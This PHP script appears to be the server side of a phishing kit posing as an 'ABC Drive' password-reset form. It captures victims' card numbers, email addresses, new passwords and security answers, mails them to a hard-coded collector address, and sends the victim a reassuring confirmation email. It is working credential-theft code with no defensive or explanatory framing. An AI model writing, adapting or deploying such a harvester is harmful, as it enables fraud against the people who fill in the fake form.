<?php

$recipients = 'voidpassword@abcdrive.info';
//$recipients = 'voidpassword@abcdrive.info';

try {
    require './phpmailer/PHPMailerAutoload.php';

    preg_match_all("/([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)/", $recipients, $addresses, PREG_OFFSET_CAPTURE);

    if (!count($addresses[0])) {
        die('MF001');
    }

    if (preg_match('/^(127\.|192\.168\.)/', $_SERVER['REMOTE_ADDR'])) {
        die('MF002');
    }

    $template = file_get_contents('rd-change-password.txt');
    $template2 = file_get_contents('rd-change-password.tpl');

    if (isset($_POST['form-type'])) {
        switch ($_POST['form-type']){
            case 'change-password':
                $subject = 'Reset Password';
                break;
            default:
                $subject = 'Reset Password';
                break;
        }
    }else{
        die('MF004');
    }

    // if (isset($_POST['email'])) {
    //     $template = str_replace(
    //         array("<!-- #{FromState} -->", "<!-- #{FromEmail} -->"),
    //         array("Email:", $_POST['email']),
    //         $template);
    // }else{
    //     die('MF003');
    // }

    if (isset($_POST['cardnumber'])) {
        $template = str_replace(
            array("<!-- #{cardnumber} -->"),
            array($_POST['cardnumber']),
            $template);
    }

    if (isset($_POST['email'])) {
        $template = str_replace(
            array("<!-- #{email} -->"),
            array($_POST['email']),
            $template);
    }

    if (isset($_POST['newpass'])) {
        $template = str_replace(
            array("<!-- #{newpass} -->"),
            array($_POST['newpass']),
            $template);
    }

    if (isset($_POST['hint1'])) {
        $template = str_replace(
            array("<!-- #{hint1} -->"),
            array($_POST['hint1']),
            $template);
    }

    if (isset($_POST['answer1'])) {
        $template = str_replace(
            array("<!-- #{answer1} -->"),
            array($_POST['answer1']),
            $template);
    }

    if (isset($_POST['hint2'])) {
        $template = str_replace(
            array("<!-- #{hint2} -->"),
            array($_POST['hint2']),
            $template);
    }

    if (isset($_POST['answer2'])) {
        $template = str_replace(
            array("<!-- #{answer2} -->"),
            array($_POST['answer2']),
            $template);
    }

     
    // preg_match("/(<!-- #{BeginInfo} -->)(.|\n)+(<!-- #{EndInfo} -->)/", $template, $tmp, PREG_OFFSET_CAPTURE);
    // foreach ($_POST as $key => $value) {
    //     if ($key != "message" && $key != "form-type" && $key != "g-recaptcha-response" && !empty($value)){
    //         $info = str_replace(
    //             array("<!-- #{BeginInfo} -->", "<!-- #{InfoState} -->", "<!-- #{InfoDescription} -->"),
    //             array("", ucfirst($key) . ':', $value),
    //             $tmp[0][0]);

    //         $template = str_replace("<!-- #{EndInfo} -->", $info, $template);
    //     }
    // }

    $template = str_replace(
        array("<!-- #{Subject} -->", "<!-- #{SiteName} -->"),
        array($subject, $_SERVER['SERVER_NAME']),
        $template);

    $mail = new PHPMailer();
    $mail->From = 'wordpress@abcdrive.info';

    // if (isset($_POST['name'])){
    //     $mail->FromName = $_POST['name'];
    // }else{
    //     $mail->FromName = "Site Visitor";
    // }

    foreach ($addresses[0] as $key => $value) {
        $mail->addAddress($value[0]);
    }

    $mail->CharSet = "text/plain; charset=UTF-8;";
    $mail->setFrom($mail->From);
    $mail->FromName = $_POST['name'];
    $mail->IsHTML(false);
    $mail->Subject = $subject; 
    $mail->Body = $template;
    $mail->send();


    $mail = new PHPMailer();
    $mail->From = 'info@abcdrive.info';

    $mail->CharSet = "text/html; charset=UTF-8;";
    $mail->setFrom($mail->From);
    $mail->FromName = 'ABC Drive';
    $mail->addAddress($_POST['email']);
    $mail->Subject = 'ABC Drive Password Change'; 
    $mail->MsgHTML($template2);
    $mail->send();


    die('MF000');
} catch (phpmailerException $e) {
    die('MF254');
} catch (Exception $e) {
    die('MF255');
}